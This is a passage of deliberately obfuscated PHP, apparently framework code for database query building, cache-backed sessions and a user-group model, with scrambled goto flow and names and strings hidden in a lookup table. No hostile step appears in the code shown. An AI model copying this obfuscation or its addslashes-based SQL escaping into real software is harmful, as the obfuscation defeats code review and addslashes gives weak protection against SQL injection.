$eጻ[$CҏƠ[929]] : array()); } elseif (empty($eጻ)) { if (think_config($CҏƠ[930]) && $CҏƠ[758] != strtolower(think_config($CҏƠ[931]))) { $eጻ = $this->parseDSN(think_config($CҏƠ[930])); } else { $eጻ = array($CҏƠ[919] => think_config($CҏƠ[931]), $CҏƠ[847] => think_config($CҏƠ[932]), $CҏƠ[848] => think_config($CҏƠ[933]), $CҏƠ[845] => think_config($CҏƠ[934]), $CҏƠ[846] => think_config($CҏƠ[935]), $CҏƠ[17] => think_config($CҏƠ[244]), $CҏƠ[874] => think_config($CҏƠ[930]), $CҏƠ[13] => think_config($CҏƠ[936])); } } return $eጻ; } protected function initConnect($D֛ͺ = true) { if (1 == think_config($_SERVER[̉][18])) { $this->_linkID = $this->multiConnect($D֛ͺ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $d˿ => $eꢏ) { $this->_linkID = $eꢏ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($AƲֽ = false) { goto A؃; b: $A = array($B΄ֆ[847] => isset($aӢ̛[$B΄ֆ[847]][$FĂ]) ? $aӢ̛[$B΄ֆ[847]][$FĂ] : $aӢ̛[$B΄ֆ[847]][0], $B΄ֆ[848] => isset($aӢ̛[$B΄ֆ[848]][$FĂ]) ? $aӢ̛[$B΄ֆ[848]][$FĂ] : $aӢ̛[$B΄ֆ[848]][0], $B΄ֆ[845] => isset($aӢ̛[$B΄ֆ[845]][$FĂ]) ? $aӢ̛[$B΄ֆ[845]][$FĂ] : $aӢ̛[$B΄ֆ[845]][0], $B΄ֆ[846] => isset($aӢ̛[$B΄ֆ[846]][$FĂ]) ? $aӢ̛[$B΄ֆ[846]][$FĂ] : $aӢ̛[$B΄ֆ[846]][0], $B΄ֆ[17] => isset($aӢ̛[$B΄ֆ[17]][$FĂ]) ? $aӢ̛[$B΄ֆ[17]][$FĂ] : $aӢ̛[$B΄ֆ[17]][0], $B΄ֆ[874] => isset($aӢ̛[$B΄ֆ[874]][$FĂ]) ? $aӢ̛[$B΄ֆ[874]][$FĂ] : $aӢ̛[$B΄ֆ[874]][0], $B΄ֆ[13] => isset($aӢ̛[$B΄ֆ[13]][$FĂ]) ? $aӢ̛[$B΄ֆ[13]][$FĂ] : $aӢ̛[$B΄ֆ[13]][0]); return $this->connect($A, $FĂ); goto F̟՟; B׌桑: if (empty($aӢ̛)) { foreach ($this->config as $bד => $aȊú) { $aӢ̛[$bד] = explode($B΄ֆ[47], $aȊú); } } if (think_config($B΄ֆ[937])) { if ($AƲֽ) { $FĂ = floor(mt_rand(0, think_config($B΄ֆ[938]) - 1)); $B؍荻 = $FĂ; } else { if (is_numeric(think_config($B΄ֆ[939]))) { $FĂ = think_config($B΄ֆ[939]); } else { $FĂ = floor(mt_rand(think_config($B΄ֆ[938]), count($aӢ̛[$B΄ֆ[845]]) - 1)); } } } else { $FĂ = floor(mt_rand(0, count($aӢ̛[$B΄ֆ[845]]) - 1)); $B؍荻 = $FĂ; } $FĂ = $B؍荻 !== -1 ? $B؍荻 : $FĂ; goto b; A؃: $B΄ֆ =& $_SERVER[̉]; static $aӢ̛ = array(); static $B؍荻 = -1; goto B׌桑; F̟՟: } public function parseDSN($eփ) { $eܼ =& $_SERVER[̉]; if (empty($eփ)) { return !1; } $bΕ̤ = parse_url($eփ); if ($bΕ̤[$eܼ[174]]) { $A = array($eܼ[919] => $bΕ̤[$eܼ[174]], $eܼ[847] => isset($bΕ̤[$eܼ[562]]) ? $bΕ̤[$eܼ[562]] : $eܼ[33], $eܼ[848] => isset($bΕ̤[$eܼ[940]]) ? $bΕ̤[$eܼ[940]] : $eܼ[33], $eܼ[845] => isset($bΕ̤[$eܼ[175]]) ? $bΕ̤[$eܼ[175]] : $eܼ[33], $eܼ[846] => isset($bΕ̤[$eܼ[176]]) ? $bΕ̤[$eܼ[176]] : $eܼ[33], $eܼ[17] => isset($bΕ̤[$eܼ[76]]) ? substr($bΕ̤[$eܼ[76]], 1) : $eܼ[33]); } else { preg_match($eܼ[941], trim($eփ), $Bڼ쥶); $A = array($eܼ[919] => $Bڼ쥶[1], $eܼ[847] => $Bڼ쥶[2], $eܼ[848] => $Bڼ쥶[3], $eܼ[845] => $Bڼ쥶[4], $eܼ[846] => $Bڼ쥶[5], $eܼ[17] => $Bڼ쥶[6]); } $A[$eܼ[874]] = $eܼ[33]; return $A; } protected function debug() { $ač =& $_SERVER[̉]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ač[942]; if (think_config($ač[943])) { think_status($ač[944]); think_trace($this->queryStr . $ač[945] . think_status($ač[20], $ač[944], 6) . $ač[946], $ač[33], $ač[947]); } } protected function parseLock($aï = false) { $D =& $_SERVER[̉]; if (!$aï) { return $D[33]; } if ($D[876] == $this->dbType) { return $D[948]; } return $D[949]; } protected function parseSet($f萑) { $Eق =& $_SERVER[̉]; foreach ($f萑 as $Eԇ => $D) { if (is_array($D) && $Eق[295] == $D[0]) { $bǆ[] = $this->parseKey($Eԇ) . $Eق[950] . $D[1]; } elseif (is_scalar($D) || is_null($D)) { $bǆ[] = $this->parseKey($Eԇ) . $Eق[950] . $this->parseValue($D); } } return $Eق[951] . implode($Eق[47], $bǆ); } protected function bindParam($D׍퍬, $B͸) { $this->bind[$_SERVER[̉][4] . $D׍퍬] = $B͸; } protected function parseBind($aĚ댉) { $aĚ댉 = array_merge($this->bind, $aĚ댉); $this->bind = array(); return $aĚ댉; } function parseKey(&$f̍, $B륫 = true) { if ($B륫) { $f̍ = $this->parseKeyCheck($f̍); } return $f̍; } function parseKeyCheck($cס) { $Dă =& $_SERVER[̉]; $cס = trim($cס); if (!preg_match($Dă[952], $cס)) { think_exception($Dă[953] . $cס); } return $cס; } protected function parseValue($DΊĊ) { $c =& $_SERVER[̉]; if (is_string($DΊĊ)) { $DΊĊ = $c[915] . $this->escapeString($DΊĊ) . $c[915]; } elseif (isset($DΊĊ[0]) && is_string($DΊĊ[0]) && strtolower($DΊĊ[0]) == $c[295]) { $DΊĊ = $this->escapeString($DΊĊ[1]); } elseif (is_array($DΊĊ)) { $DΊĊ = array_map(array($this, $c[916]), $DΊĊ); } elseif (is_bool($DΊĊ)) { $DΊĊ = $DΊĊ ? $c[87] : $c[191]; } elseif (is_null($DΊĊ)) { $DΊĊ = $c[103]; } return $DΊĊ; } protected function parseField($e쩖) { $BȋΈ =& $_SERVER[̉]; if (is_string($e쩖) && strpos($e쩖, $BȋΈ[47])) { $e쩖 = explode($BȋΈ[47], $e쩖); } if (is_array($e쩖)) { $a = array(); foreach ($e쩖 as $aӨ => $Fګ) { if (!is_numeric($aӨ)) { $a[] = $this->parseKey($aӨ, !1) . $BȋΈ[954] . $this->parseKey($Fګ); } else { $a[] = $this->parseKey($Fګ); } } $a̶ = implode($BȋΈ[47], $a); } elseif (is_string($e쩖) && !empty($e쩖)) { $a̶ = $e쩖; } else { $a̶ = $BȋΈ[182]; } return $a̶; } protected function parseTable($DӇ) { $DҨ硉 =& $_SERVER[̉]; if (is_array($DӇ)) { $bߎ = array(); foreach ($DӇ as $eػ => $Aٵ܂) { if (!is_numeric($eػ)) { $bߎ[] = $this->parseKey($eػ) . $DҨ硉[50] . $this->parseKey($Aٵ܂); } else { $bߎ[] = $this->parseKey($eػ); } } $DӇ = $bߎ; } elseif (is_string($DӇ)) { if (strstr($DӇ, $DҨ硉[50])) { return $DӇ; } $DӇ = explode($DҨ硉[47], $DӇ); array_walk($DӇ, array($this, $DҨ硉[865])); } return $DҨ硉[859] . trim(implode($DҨ硉[955], $DӇ), $DҨ硉[382]) . $DҨ硉[859]; } protected function parseWhere($f) { $aϊ =& $_SERVER[̉]; $Aݶ݇ = $aϊ[33]; if (is_string($f)) { $Aݶ݇ = $f; } else { $a⃵ = isset($f[$aϊ[956]]) ? strtoupper($f[$aϊ[956]]) : $aϊ[33]; if (in_array($a⃵, array($aϊ[957], $aϊ[958], $aϊ[959]))) { $a⃵ = $aϊ[50] . $a⃵ . $aϊ[50]; unset($f[$aϊ[956]]); } else { $a⃵ = $aϊ[960]; } foreach ($f as $C => $Fʜ) { $Aݶ݇ .= $aϊ[275]; if (is_numeric($C)) { $C = $aϊ[961]; } if (0 === strpos($C, $aϊ[71])) { $Aݶ݇ .= $this->parseThinkWhere($C, $Fʜ); } else { if (!preg_match($aϊ[962], trim($C))) { think_exception(think_lang($aϊ[963]) . $aϊ[4] . $C); } $dŪ = is_array($Fʜ) && isset($Fʜ[$aϊ[964]]); $C = trim($C); if (strpos($C, $aϊ[281])) { $Cҋ = explode($aϊ[281], $C); $Dѓ = array(); foreach ($Cҋ as $d՞ => $E) { $c = $dŪ ? $Fʜ[$d՞] : $Fʜ; $Dѓ[] = $aϊ[258] . $this->parseWhereItem($this->parseKey($E), $c) . $aϊ[864]; } $Aݶ݇ .= implode($aϊ[965], $Dѓ); } elseif (strpos($C, $aϊ[282])) { $Cҋ = explode($aϊ[282], $C); $Dѓ = array(); foreach ($Cҋ as $d՞ => $E) { $c = $dŪ ? $Fʜ[$d՞] : $Fʜ; $Dѓ[] = $aϊ[258] . $this->parseWhereItem($this->parseKey($E), $c) . $aϊ[864]; } $Aݶ݇ .= implode($aϊ[960], $Dѓ); } else { $Aݶ݇ .= $this->parseWhereItem($this->parseKey($C), $Fʜ); } } $Aݶ݇ .= $aϊ[276] . $a⃵; } $Aݶ݇ = substr($Aݶ݇, 0, -strlen($a⃵)); } return empty($Aݶ݇) ? $aϊ[33] : $aϊ[966] . $Aݶ݇; } protected function parseWhereItem($E̊, $Fͮ) { $fǲ =& $_SERVER[̉]; $F = $fǲ[33]; if (is_array($Fͮ)) { if (is_string($Fͮ[0])) { $Fߜ = strtolower($Fͮ[0]); if (in_array($Fͮ[0], array($fǲ[950], $fǲ[967], $fǲ[968], $fǲ[969], $fǲ[970], $fǲ[971]))) { $F .= $E̊ . $fǲ[50] . $Fͮ[0] . $fǲ[50] . $this->parseValue($Fͮ[1]); } elseif (preg_match($fǲ[972], $Fͮ[0])) { $F .= $E̊ . $fǲ[50] . $this->exp[$Fߜ] . $fǲ[50] . $this->parseValue($Fͮ[1]); } elseif (preg_match($fǲ[973], $Fͮ[0])) { if (is_array($Fͮ[1])) { $e҉ = isset($Fͮ[2]) ? strtoupper($Fͮ[2]) : $fǲ[958]; if (in_array($e҉, array($fǲ[957], $fǲ[958], $fǲ[959]))) { $eӒ޻ǰ = array(); foreach ($Fͮ[1] as $E؎) { $eӒ޻ǰ[] = $E̊ . $fǲ[50] . $this->exp[$Fߜ] . $fǲ[50] . $this->parseValue($E؎); } $F .= $fǲ[258] . implode($fǲ[50] . $e҉ . $fǲ[50], $eӒ޻ǰ) . $fǲ[864]; } } else { $F .= $E̊ . $fǲ[50] . $this->exp[$Fߜ] . $fǲ[50] . $this->parseValue($Fͮ[1]); } } elseif ($fǲ[295] == $Fߜ) { $F .= $fǲ[862] . $E̊ . $fǲ[50] . $Fͮ[1] . $fǲ[974]; } elseif (preg_match($fǲ[975], $Fͮ[0])) { $F .= $Fͮ[0]; } elseif (preg_match($fǲ[976], $Fͮ[0])) { if (isset($Fͮ[2]) && $fǲ[295] == $Fͮ[2]) { $F .= $E̊ . $fǲ[50] . $this->exp[$Fߜ] . $fǲ[50] . $Fͮ[1]; } else { if (is_string($Fͮ[1])) { $Fͮ[1] = explode($fǲ[47], $Fͮ[1]); } $EϹ댅 = implode($fǲ[47], $this->parseValue($Fͮ[1])); $F .= $E̊ . $fǲ[50] . $this->exp[$Fߜ] . $fǲ[862] . $EϹ댅 . $fǲ[864]; } } elseif (preg_match($fǲ[977], $Fͮ[0])) { $F򗡠 = is_string($Fͮ[1]) ? explode($fǲ[47], $Fͮ[1]) : $Fͮ[1]; $F .= $fǲ[862] . $E̊ . $fǲ[50] . $this->exp[$Fߜ] . $fǲ[50] . $this->parseValue($F򗡠[0]) . $fǲ[960] . $this->parseValue($F򗡠[1]) . $fǲ[276]; } else { think_exception(think_lang($fǲ[963]) . $fǲ[4] . $Fͮ[0]); } } else { $D̍ = count($Fͮ); $a = $fǲ[33]; if (is_string($Fͮ[$D̍ - 1])) { $a = isset($Fͮ[$D̍ - 1]) ? strtoupper($Fͮ[$D̍ - 1]) : $fǲ[33]; if (in_array($a, array($fǲ[957], $fǲ[958], $fǲ[959]))) { $D̍ = $D̍ - 1; } } else { $a = $fǲ[957]; } for ($Fь = 0; $Fь < $D̍; $Fь++) { $F򗡠 = is_array($Fͮ[$Fь]) ? $Fͮ[$Fь][1] : $Fͮ[$Fь]; if ($fǲ[295] == strtolower($Fͮ[$Fь][0])) { $F .= $fǲ[258] . $E̊ . $fǲ[50] . $F򗡠 . $fǲ[974] . $a . $fǲ[50]; } else { $bҠ = is_array($Fͮ[$Fь]) ? $this->exp[strtolower($Fͮ[$Fь][0])] : $fǲ[950]; if (!$bҠ && is_array($Fͮ[$Fь]) && in_array($Fͮ[$Fь][0], array($fǲ[950], $fǲ[967], $fǲ[968], $fǲ[969], $fǲ[970], $fǲ[971]))) { $bҠ = $Fͮ[$Fь][0]; } $F .= $fǲ[258] . $E̊ . $fǲ[50] . $bҠ . $fǲ[50] . $this->parseValue($F򗡠) . $fǲ[974] . $a . $fǲ[50]; } } $F = substr($F, 0, -4); } } else { $F .= $E̊ . $fǲ[978] . $this->parseValue($Fͮ); } return $F; } protected function parseThinkWhere($Dܟ, $CƎϧ) { $eۺ̂ =& $_SERVER[̉]; $fĴڽ = $eۺ̂[33]; switch ($Dܟ) { case $eۺ̂[350]: $fĴڽ = $CƎϧ; break; case $eۺ̂[961]: $fĴڽ = is_string($CƎϧ) ? $CƎϧ : substr($this->parseWhere($CƎϧ), 6); break; case $eۺ̂[979]: parse_str($CƎϧ, $c̝Ĉ); if (isset($c̝Ĉ[$eۺ̂[956]])) { $C܌ = $eۺ̂[50] . strtoupper($c̝Ĉ[$eۺ̂[956]]) . $eۺ̂[50]; unset($c̝Ĉ[$eۺ̂[956]]); } else { $C܌ = $eۺ̂[960]; } $cߌ = array(); foreach ($c̝Ĉ as $D => $A) { $cߌ[] = $this->parseKey($D) . $eۺ̂[978] . $this->parseValue($A); } $fĴڽ = implode($C܌, $cߌ); break; } return $fĴڽ; } protected function parseLimit($aƏ) { $D =& $_SERVER[̉]; return !empty($aƏ) ? $D[48] . $aƏ . $D[50] : $D[33]; } protected function parseJoin($Eн) { $D읮 =& $_SERVER[̉]; $Dߌ = $D읮[33]; if (!empty($Eн)) { if (is_array($Eн)) { foreach ($Eн as $f => $F𛣖˙) { if (!1 !== stripos($F𛣖˙, $D읮[980])) { $Dߌ .= $D읮[50] . $F𛣖˙; } else { $Dߌ .= $D읮[981] . $F𛣖˙; } } } else { $Dߌ .= $D읮[981] . $Eн; } } $Dߌ = preg_replace($D읮[982], think_config($D읮[888]) . $D읮[983], $Dߌ); return $Dߌ; } protected function parseOrder($a) { $dψ =& $_SERVER[̉]; if (is_array($a)) { $c = array(); foreach ($a as $D± => $eݕ) { if (is_numeric($D±)) { $c[] = $this->parseKey($eݕ); } else { $eݕ = in_array(strtoupper(trim($eݕ)), array($dψ[984], $dψ[985])) ? $dψ[50] . $eݕ : $dψ[33]; if (preg_match($dψ[986], $D±)) { $c[] = $this->parseKey($D±) . $eݕ; } else { think_exception($dψ[987] . $D±); } } } $a = implode($dψ[47], $c); } return !empty($a) ? $dψ[988] . $a : $dψ[33]; } protected function parseGroup($Aҭ) { $Fҟ =& $_SERVER[̉]; return !empty($Aҭ) ? $Fҟ[989] . $Aҭ : $Fҟ[33]; } protected function parseHaving($fг) { $AØ =& $_SERVER[̉]; return !empty($fг) ? $AØ[990] . $fг : $AØ[33]; } protected function parseComment($D܎) { $D =& $_SERVER[̉]; return !empty($D܎) ? $D[991] . $D܎ . $D[992] : $D[33]; } protected function parseDistinct($D߇Ρ) { $D׋͚ =& $_SERVER[̉]; return !empty($D߇Ρ) ? $D׋͚[993] : $D׋͚[33]; } protected function parseUnion($D釴ϒ) { $a¶ =& $_SERVER[̉]; if (empty($D釴ϒ)) { return $a¶[33]; } if (isset($D釴ϒ[$a¶[346]])) { $E = $a¶[994]; unset($D釴ϒ[$a¶[346]]); } else { $E = $a¶[995]; } foreach ($D釴ϒ as $Fϓܘ) { $d[] = $E . (is_array($Fϓܘ) ? $this->buildSelectSql($Fϓܘ) : $Fϓܘ); } return implode($a¶[50], $d); } public function insert($B, $A޸ = array(), $cՄ = false) { goto EŜ; EŜ: $fׄ =& $_SERVER[̉]; $C╡ = $C = array(); $this->model = $A޸[$fׄ[279]]; goto eא; EΡ: $F .= $this->parseComment(!empty($A޸[$fׄ[352]]) ? $A޸[$fׄ[352]] : $fׄ[33]); return $this->execute($F, $this->parseBind(!empty($A޸[$fׄ[283]]) ? $A޸[$fׄ[283]] : array())); goto E㨍̉; eא: foreach ($B as $E => $fĴ) { if (is_array($fĴ) && $fׄ[295] == $fĴ[0]) { $C[] = $this->parseKey($E); $C╡[] = $fĴ[1]; } elseif (is_scalar($fĴ) || is_null($fĴ)) { $C[] = $this->parseKey($E); $C╡[] = $this->parseValue($fĴ); } } $F = ($cՄ ? $fׄ[866] : $fׄ[867]) . $fׄ[868] . $this->parseTable($A޸[$fׄ[277]]) . $fׄ[862] . implode($fׄ[47], $C) . $fׄ[863] . implode($fׄ[47], $C╡) . $fׄ[864]; $F .= $this->parseLock(isset($A޸[$fׄ[815]]) ? $A޸[$fׄ[815]] : !1); goto EΡ; E㨍̉: } public function selectInsert($C, $Bړ, $Dׄ = array()) { goto A᪬ݣ; a: return $this->execute($d, $this->parseBind(!empty($Dׄ[$eՠ[283]]) ? $Dׄ[$eՠ[283]] : array())); goto aҙ; F: array_walk($C, array($this, $eՠ[865])); $d = $eՠ[996] . $this->parseTable($Bړ) . $eՠ[862] . implode($eՠ[47], $C) . $eՠ[974]; $d .= $this->buildSelectSql($Dׄ); goto a; A᪬ݣ: $eՠ =& $_SERVER[̉]; $this->model = $Dׄ[$eՠ[279]]; if (is_string($C)) { $C = explode($eՠ[47], $C); } goto F; aҙ: } public function update($F, $Cⷴ) { $D =& $_SERVER[̉]; $this->model = $Cⷴ[$D[279]]; $cּ = $D[997] . $this->parseTable($Cⷴ[$D[277]]) . $this->parseSet($F) . $this->parseWhere(!empty($Cⷴ[$D[273]]) ? $Cⷴ[$D[273]] : $D[33]) . $this->parseOrder(!empty($Cⷴ[$D[363]]) ? $Cⷴ[$D[363]] : $D[33]) . $this->parseLimit(!empty($Cⷴ[$D[290]]) ? $Cⷴ[$D[290]] : $D[33]) . $this->parseLock(isset($Cⷴ[$D[815]]) ? $Cⷴ[$D[815]] : !1) . $this->parseComment(!empty($Cⷴ[$D[352]]) ? $Cⷴ[$D[352]] : $D[33]); return $this->execute($cּ, $this->parseBind(!empty($Cⷴ[$D[283]]) ? $Cⷴ[$D[283]] : array())); } public function delete($e = array()) { $Bݫ =& $_SERVER[̉]; $this->model = $e[$Bݫ[279]]; $Dê佰 = $Bݫ[998] . $this->parseTable($e[$Bݫ[277]]) . $this->parseWhere(!empty($e[$Bݫ[273]]) ? $e[$Bݫ[273]] : $Bݫ[33]) . $this->parseOrder(!empty($e[$Bݫ[363]]) ? $e[$Bݫ[363]] : $Bݫ[33]) . $this->parseLimit(!empty($e[$Bݫ[290]]) ? $e[$Bݫ[290]] : $Bݫ[33]) . $this->parseLock(isset($e[$Bݫ[815]]) ? $e[$Bݫ[815]] : !1) . $this->parseComment(!empty($e[$Bݫ[352]]) ? $e[$Bݫ[352]] : $Bݫ[33]); return $this->execute($Dê佰, $this->parseBind(!empty($e[$Bݫ[283]]) ? $e[$Bݫ[283]] : array())); } public function select($b⊕Ҏ = array()) { goto F銾; F銾: $f =& $_SERVER[̉]; $this->model = $b⊕Ҏ[$f[279]]; $AИ = $this->buildSelectSql($b⊕Ҏ); goto Aƣ؏; D՟: if ($Cǃ && !1 !== $Eٹ񱋏) { think_cache($Aθ, $Eٹ񱋏, $Cǃ); } return $Eٹ񱋏; goto dׅ; Aƣ؏: $Cǃ = isset($b⊕Ҏ[$f[347]]) ? $b⊕Ҏ[$f[347]] : !1; if ($Cǃ) { $Aθ = is_string($Cǃ[$f[93]]) ? $Cǃ[$f[93]] : $f[999] . md5($AИ); $F鰜 = think_cache($Aθ, $f[33], $Cǃ); if (!1 !== $F鰜) { return $F鰜; } } $Eٹ񱋏 = $this->query($AИ, $this->parseBind(!empty($b⊕Ҏ[$f[283]]) ? $b⊕Ҏ[$f[283]] : array())); goto D՟; dׅ: } public function buildSelectSql($b˂՗ = array()) { goto E򃻊; cۙ龧: return $b𴋷; goto A; E򃻊: $Dٕ =& $_SERVER[̉]; if (isset($b˂՗[$Dٕ[351]])) { if (strpos($b˂՗[$Dٕ[351]], $Dٕ[47])) { list($B, $Bҍ) = explode($Dٕ[47], $b˂՗[$Dٕ[351]]); } else { $B = $b˂՗[$Dٕ[351]]; } $B = $B ? $B : 1; $Bҍ = isset($Bҍ) ? $Bҍ : (is_numeric($b˂՗[$Dٕ[290]]) ? $b˂՗[$Dٕ[290]] : 20); $B = $Bҍ * ((int) $B - 1); $b˂՗[$Dٕ[290]] = $B . $Dٕ[47] . $Bҍ; } if (think_config($Dٕ[1000])) { $eӿ = $Dٕ[1001] . md5(serialize($b˂՗)); $BűҜ = think_cache($eӿ); if ($BűҜ) { return $BűҜ; } } goto Eڗﾷ; Eڗﾷ: $b𴋷 = $this->parseSql($this->selectSql, $b˂՗); $b𴋷 .= $this->parseLock(isset($b˂՗[$Dٕ[815]]) ? $b˂՗[$Dٕ[815]] : !1); if (isset($eӿ)) { think_cache($eӿ, $b𴋷); } goto cۙ龧; A: } public function parseSql($FȊ, $e뺞 = array()) { $fº =& $_SERVER[̉]; $FȊ = str_replace(array($fº[1002], $fº[1003], $fº[1004], $fº[1005], $fº[1006], $fº[1007], $fº[1008], $fº[1009], $fº[1010], $fº[1011], $fº[1012]), array($this->parseTable("{$e뺞[$fº[277]]}"), $this->parseDistinct(isset($e뺞[$fº[1013]]) ? $e뺞[$fº[1013]] : !1), $this->parseField(!empty($e뺞[$fº[271]]) ? $e뺞[$fº[271]] : $fº[182]), $this->parseJoin(!empty($e뺞[$fº[280]]) ? $e뺞[$fº[280]] : $fº[33]), $this->parseWhere(!empty($e뺞[$fº[273]]) ? $e뺞[$fº[273]] : $fº[33]), $this->parseGroup(!empty($e뺞[$fº[1014]]) ? $e뺞[$fº[1014]] : $fº[33]), $this->parseHaving(!empty($e뺞[$fº[1015]]) ? $e뺞[$fº[1015]] : $fº[33]), $this->parseOrder(!empty($e뺞[$fº[363]]) ? $e뺞[$fº[363]] : $fº[33]), $this->parseLimit(!empty($e뺞[$fº[290]]) ? $e뺞[$fº[290]] : $fº[33]), $this->parseUnion(!empty($e뺞[$fº[345]]) ? $e뺞[$fº[345]] : $fº[33]), $this->parseComment(!empty($e뺞[$fº[352]]) ? $e뺞[$fº[352]] : $fº[33])), $FȊ); return $FȊ; } public function getLastSql($Cȋ = '') { return $Cȋ ? $this->modelSql[$Cȋ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($F) { return addslashes($F); } public function setModel($a) { $this->model = $a; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto CŃ͘Ш; dħ: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto E校; e夣: $Dꅰ = $c[$dϧ]; $cι裐 = $c[$DǑ[796]]; switch ($dϧ) { case $DǑ[17]: self::$handle = Model($DǑ[797]); break; case $DǑ[798]: self::$handle = new CacheRedis($Dꅰ, $cι裐); break; case $DǑ[799]: self::$handle = new CacheMemcached($Dꅰ, $cι裐); break; case $DǑ[193]: $Dꅰ[$DǑ[76]] = $Dꅰ[$DǑ[76]] . $DǑ[1494]; self::$handle = new CacheFile($Dꅰ, $cι裐); default: break; } goto bОЂ; E校: $DǑ =& $_SERVER[̉]; static $DՉ = false; if ($DՉ) { return $DՉ; } goto E䶩; bОЂ: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $DՉ = new self(); return $DՉ; goto Fڜ; cے: if (self::$sessionSign) { } else { if (Cookie::get($c)) { self::$sessionSign = Cookie::get($c); } else { self::$sessionSign = guid(); } } Cookie::setSafe($c, self::$sessionSign, self::$sessionTime); $dϧ = $c[$DǑ[1493]]; goto e夣; E䶩: $c = $GLOBALS[$DǑ[6]][$DǑ[347]]; self::$sessionTime = $c[$DǑ[1491]]; $c = isset($GLOBALS[$DǑ[1492]]) ? $GLOBALS[$DǑ[1492]] : SESSION_ID; goto cے; Fڜ: } public static function sign($d˼ = false) { $d˼ && (self::$sessionSign = $d˼); self::init(); return self::$sessionSign; } public static function set($C͍, $Fڋ؝Ư = false) { self::init(); if (is_array($C͍)) { foreach ($C͍ as $aїՄ => $Cψ) { array_set_value(self::$data, $aїՄ, $Cψ); } } else { array_set_value(self::$data, $C͍, $Fڋ؝Ư); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($CΣ = false) { self::init(); if (!$CΣ) { return self::$data; } return array_get_value(self::$data, $CΣ); } public static function remove($C鎘) { self::init(); unset(self::$data[$C鎘]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[̉][801])) { self::$handle->clearTimeout(); } } } $Fٶ = $_SERVER[$_SERVER[̉][835]]; $D = $_SERVER[̉][1214]; goto Cӛ; d: class GroupModel extends ModelBase { protected $tableName = "\147\x72\157\165\160"; protected $tableMeta = array("\x74\141\142\154\x65\116\141\155\x65" => "\147\x72\157\165\x70\137\155\145\x74\141", "\x6d\x65\x74\141\x46\x69\x65\x6c\144" => "\147\162\157\x75\x70\x49\x44"); protected function cacheFunctionAlias($C) { $eݚϏ =& $_SERVER[̉]; return array($eݚϏ[1765] => array($C[0], $eݚϏ[1766]), $eݚϏ[1767] => array($C[0], $eݚϏ[1766])); } protected function getInfo($dӢ) { $C = $this->getInfoSimple($dӢ); if (!$C) { return !1; } return $this->_listDataApplyItem($C); } protected function getInfoSimple($c왍, $cọ = false) { $dڇ =& $_SERVER[̉]; if ($cọ) { $f䩅 = array($dڇ[1695] => intval($c왍)); $E굸 = $this->where($f䩅)->find(); return is_array($E굸) ? $E굸 : array(); } return $this->cacheFunctionGet($dڇ[1768], $c왍); } protected function groupAdd($B跎) { goto D; D: $cʷ =& $_SERVER[̉]; if (!$B跎[$cʷ[478]] && isset($B跎[$cʷ[1695]]) && $B跎[$cʷ[1695]] == 1) { if ($E = $this->getInfoSimple($B跎[$cʷ[1695]], !0)) { return $B跎[$cʷ[1695]]; } } else { $E = $this->getInfoSimple($B跎[$cʷ[478]]); if (!$E) { return !1; } } $Cфҕ = $cʷ[498]; goto F; E: if (isset($B跎[$cʷ[1771]])) { $this->metaSet($Aƌ, array($cʷ[1771] => $B跎[$cʷ[1771]], $cʷ[1772] => $B跎[$cʷ[1772]])); unset($B跎[$cʷ[1771]]); unset($B跎[$cʷ[1772]]); } Model($cʷ[1205])->groupRootAdd($Aƌ); return $Aƌ; goto e߸; Aśީ: if (!empty($B跎[$cʷ[1695]])) { $dԫ[$cʷ[1695]] = $B跎[$cʷ[1695]]; } $Aƌ = $this->add($dԫ); $this->setNamePinyin($Aƌ, $dԫ[$cʷ[28]]); goto E; F: if ($E[$cʷ[487]]) { $Cфҕ = $E[$cʷ[487]] . $E[$cʷ[1695]] . $cʷ[47]; } $dԫ = array($cʷ[413] => $this->groupNameAuto($B跎[$cʷ[478]], $B跎[$cʷ[28]]), $cʷ[394] => $B跎[$cʷ[478]], $cʷ[553] => $Cфҕ, $cʷ[1769] => $B跎[$cʷ[1679]], $cʷ[1770] => 0, $cʷ[1699] => 0); if (isset($B跎[$cʷ[1718]])) { $dԫ[$cʷ[1718]] = $B跎[$cʷ[1718]]; } else { $B׈ = $this->max($cʷ[1718]); if (!$B׈) { $B׈ = 0; } $dԫ[$cʷ[1718]] = $B׈ + 1; } goto Aśީ; e߸: } protected function groupEdit($fӿ, $fԹ) { goto e򥄟; fϚ: if (!empty($fԹ[$cϧֽ[478]])) { $d = $this->getInfoSimple($fԹ[$cϧֽ[478]]); if (!$d) { return !1; } if ($Aɉ[$cϧֽ[1695]] == $d[$cϧֽ[1695]]) { return !1; } if ($fԹ[$cϧֽ[478]] != $Aɉ[$cϧֽ[478]]) { if ($d[$cϧֽ[487]] !== $Aɉ[$cϧֽ[487]] && strpos($d[$cϧֽ[487]], $Aɉ[$cϧֽ[487]] . $Aɉ[$cϧֽ[1695]] . $cϧֽ[47]) === 0) { return !1; } $fԹ[$cϧֽ[553]] = $d[$cϧֽ[487]] . $fԹ[$cϧֽ[478]] . $cϧֽ[47]; $this->_changeChildLevel($Aɉ, $d); } } if (isset($fԹ[$cϧֽ[28]])) { $this->setNamePinyin($fӿ, $fԹ[$cϧֽ[28]]); } if (isset($fԹ[$cϧֽ[1771]])) { $this->metaSet($fӿ, array($cϧֽ[1771] => $fԹ[$cϧֽ[1771]], $cϧֽ[1772] => $fԹ[$cϧֽ[1772]])); 